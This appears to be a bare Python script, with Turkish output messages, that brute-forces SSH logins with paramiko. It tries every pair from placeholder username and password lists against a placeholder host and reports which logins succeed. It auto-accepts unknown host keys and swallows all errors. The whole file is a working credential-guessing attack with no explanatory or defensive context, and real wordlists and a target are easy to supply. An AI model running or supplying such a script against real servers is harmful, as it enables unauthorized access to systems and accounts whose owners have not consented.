import paramiko
client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
username = ["a", "b", "c", "d"]
password = ["a", "b", "c", "d"]

for i in username:
    for j in password:
        try:
            sonuc = client.connect("ipAdresi", username=i, password = j)
            client.close()
            print("Username" + i + "Password" + j + "Bağlantı yapıldı")
        except:
            print("Username" + i + "Password" + j + "Bağlantı yapılamadı")